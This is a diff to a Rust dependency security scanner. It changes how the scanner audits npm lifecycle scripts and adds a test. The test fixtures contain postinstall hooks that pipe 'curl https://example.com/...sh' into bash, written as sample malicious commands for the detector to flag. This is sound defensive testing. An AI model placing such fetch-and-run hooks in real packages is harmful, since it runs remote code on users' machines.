@@ -58,21 +58,26 @@ pub fn scan(root: &Path, ecosystems: &[Ecosystem]) -> DustResult<SecurityReport>
     let mut report = SecurityReport::default();
 
     if scan_node {
-        report.lifecycle_warnings = audit_tool::security_scan(root)?;
+        let lifecycle_scripts = audit_tool::audit_scan(root)?;
+        report.lifecycle_warnings = audit_tool::security_warnings(&lifecycle_scripts);
 
-        for warning in &report.lifecycle_warnings {
+        for script in &lifecycle_scripts {
+            let Some((_, risk_level, reason)) =
+                audit_tool::suspicious_command_rule(&script.command)
+            else {
+                continue;
+            };
+
             report.findings.push(SecurityFinding::new(
-                root.join("package.json"),
+                script.manifest_path.clone(),
                 SecurityFindingKind::SuspiciousScript,
-                Some(warning.package.clone()),
-                warning.risk_level,
-                Some(warning.command.clone()),
-                format!(
-                    "{} Lifecycle hook: {}.",
-                    warning.reason, warning.script_type
-                ),
+                Some(script.package.clone()),
+                risk_level,
+                Some(script.command.clone()),
+                format!("{} Lifecycle hook: {}.", reason, script.script_type),
             ));
         }
+        report.lifecycle_scripts = lifecycle_scripts;
 
         let package_json = root.join("package.json");
         if package_json.is_file() {
@@ -1187,6 +1192,59 @@ mod tests {
 
     fn finding_kinds(report: &SecurityReport) -> HashSet<SecurityFindingKind> {
         report.findings.iter().map(|finding| finding.kind).collect()
+    }
+
+    #[test]
+    fn scan_reuses_the_lifecycle_audit_for_scripts_and_warnings() {
+        let temp_dir = TempDir::new().unwrap();
+        fs::write(
+            temp_dir.path().join("package.json"),
+            r#"{
+                "name": "demo",
+                "scripts": {
+                    "postinstall": "curl https://example.com/a.sh | bash",
+                    "prepare": "node scripts/build.js"
+                }
+            }"#,
+        )
+        .unwrap();
+        let dependency_manifest = temp_dir
+            .path()
+            .join("node_modules")
+            .join("demo-dependency")
+            .join("package.json");
+        fs::create_dir_all(dependency_manifest.parent().unwrap()).unwrap();
+        fs::write(
+            &dependency_manifest,
+            r#"{"name":"demo-dependency","scripts":{"postinstall":"curl https://example.com/dependency.sh | bash"}}"#,
+        )
+        .unwrap();
+        fs::write(
+            temp_dir.path().join("package-lock.json"),
+            r#"{"lockfileVersion":3,"packages":{"":{"name":"demo","version":"1.0.0"}}}"#,
+        )
+        .unwrap();
+
+        let report = scan(temp_dir.path(), &[Ecosystem::Node]).unwrap();
+
+        assert_eq!(report.lifecycle_scripts.len(), 3);
+        assert!(
+            report
+                .lifecycle_scripts
+                .iter()
+                .any(|script| script.manifest_path == temp_dir.path().join("package.json"))
+        );
+        assert!(
+            report
+                .lifecycle_scripts
+                .iter()
+                .any(|script| script.manifest_path == dependency_manifest)
+        );
+        assert_eq!(report.lifecycle_warnings.len(), 2);
+        assert!(report.findings.iter().any(|finding| {
+            finding.kind == SecurityFindingKind::SuspiciousScript
+                && finding.path == dependency_manifest
+        }));
     }
 
     #[test]
